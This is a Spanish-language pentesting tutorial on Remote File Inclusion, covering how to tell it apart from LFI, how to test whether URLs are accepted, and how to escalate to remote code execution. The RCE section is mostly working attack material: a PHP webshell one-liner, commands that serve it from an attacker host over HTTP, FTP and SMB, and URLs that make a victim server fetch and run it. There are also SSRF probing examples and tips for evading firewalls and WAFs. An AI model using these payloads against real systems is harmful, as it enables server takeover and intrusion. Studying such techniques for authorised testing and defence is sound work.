
Hasta ahora hemos trabajado con **LFI (Local File Inclusion)**. En esta sección pasamos a su “hermano mayor”: **RFI**, donde la aplicación no solo incluye archivos locales, sino también recursos remotos a través de URL.

Esto abre dos escenarios potentes:

1. **SSRF encubierto** → Enumerar servicios internos (`http://127.0.0.1:8080`, APIs internas, etc.).
    
2. **Remote Code Execution directo** → Hacer que el servidor cargue un script malicioso alojado por nosotros.
    

---

# 🔹 1. ¿Qué diferencia hay entre LFI y RFI?

Una RFI ocurre cuando una función vulnerable permite rutas como:

```
http://mi-servidor/payload.php
ftp://mi-servidor/payload.txt
\\MI-IP\recurso (en Windows)
```

No todas las funciones vulnerables permiten ejecución remota. Un resumen simplificado sería:

|Lenguaje|Función|Lee|Ejecuta|URLs remotas|
|---|---|---|---|---|
|PHP|include()|✔️|✔️|✔️|
|PHP|file_get_contents()|✔️|❌|✔️|
|.NET|include|✔️|✔️|✔️|
|.NET|RemotePartial()|✔️|❌|✔️|
|Java|import/URLClassLoader|✔️|✔️|✔️|

➡️ **Toda RFI es una LFI**  
➡️ **Pero no toda LFI es RFI**, porque el servidor puede:

- Bloquear protocolos (`http://`, `ftp://`, etc.)
    
- Permitir controlar solo parte de la ruta (p. ej. solo el nombre, no el esquema)
    
- Tener `allow_url_include` deshabilitado (en PHP)
    

---

# 🔹 2. ¿Cómo saber si una LFI también es una RFI?

## 2.1. Comprobación por configuración (PHP)

Mediante LFI + filtro base64 podemos leer `php.ini` y buscar:

```
allow_url_include = On
```

Pero esto no garantiza que el _include_ soporte URLs, solo que PHP lo permitiría.

## 2.2. Métodos fiables de verificación

La forma más práctica es **probar directamente** a incluir una URL interna que siempre debería existir:

```
http://<victima>/index.php?file=http://127.0.0.1:80/
```

Si:

- La página remota aparece renderizada → _RFI funcional_
    
- El contenido se interpreta (no como texto plano) → _ejecución PHP habilitada_
    

Esto además permite probar SSRF interno (p. ej., probar `127.0.0.1:8080`, etc.).

⚠️ Nota: evitar incluir el archivo vulnerable, o se produce recursión infinita.

---

# 🔹 3. RFI → Remote Code Execution

Si confirmamos que el servidor permite incluir URLs y ejecuta su contenido, solo necesitamos:

1. Crear un script PHP malicioso
    
2. Alojarlo en un servicio accesible
    
3. Forzar al servidor a incluirlo
    

### 3.1. Crear webshell

```bash
echo '<?php echo shell_exec($_GET["c"]); ?>' > rce.php
```

### 3.2. Servirlo desde nuestro equipo

#### Opción A — Servidor HTTP sencillo

```bash
sudo python3 -m http.server 9000
```

URL de ataque:

```
http://victima/app.php?view=http://<TU_IP>:9000/rce.php&c=id
```

#### Opción B — FTP (útil si bloquean HTTP)

```bash
sudo python3 -m pyftpdlib -p 21
```

Ataque:

```
?view=ftp://<TU_IP>/rce.php&c=whoami
```

👤 Si el servidor FTP requiere credenciales:

```
?view=ftp://usuario:clave@<TU_IP>/rce.php&c=whoami
```

#### Opción C — SMB (solo Windows, sin necesidad de allow_url_include)

```bash
impacket-smbserver share $(pwd)
```

Ataque usando UNC path:

```
?view=\\<TU_IP>\share\rce.php&c=hostname
```

✔️ En Windows, los includes vía SMB se tratan como ficheros locales → funciona incluso con `allow_url_include = Off`.

---

# 🔹 4. RFI usada como SSRF

Incluso si la función **no ejecuta** el archivo remoto, sigue siendo útil:

- Enumeración interna de puertos
    
- Acceso a endpoints de administración inaccesibles desde fuera
    
- Descubrimiento de APIs internas, servicios cloud, etc.
    

Ejemplos:

```
?file=http://127.0.0.1:8080/manager/html
?file=http://172.17.0.1:5000/metrics
```

---

# 🔹 5. Resumen operativo para pentesters

1. **Comprueba si la LFI es RFI**
    
    - Probar URLs locales → `http://127.0.0.1:80/`
        
    - Ver si el contenido se ejecuta o solo se muestra
        
2. **Si ejecuta → prepara webshell**
    
    - HTTP / FTP / SMB
        
3. **Dispara RCE**
    
    - Añade `&c=<comando>` o la variable que hayas definido
        
4. **Si no ejecuta → úsalo como SSRF**
    
    - Explora puertos internos
        
    - Identifica servicios expuestos solo localmente
        

---

# 🔹 6. Consejos prácticos reales

- Usa puertos estándar (80/443) porque los firewalls suelen permitirlos.
    
- Cambia el nombre del archivo (`img.php`, `update.dat`, `robots.php`) para evitar WAFs básicos.
    
- Si ves que el servidor añade extensiones automáticamente (p. ej. `.php`), sube el archivo sin extensión (`rce`) para evitar dobles extensiones.
    
- SMB casi siempre funciona en entornos Windows internos.
    
- Probar HTTP → FTP → SMB en ese orden.
    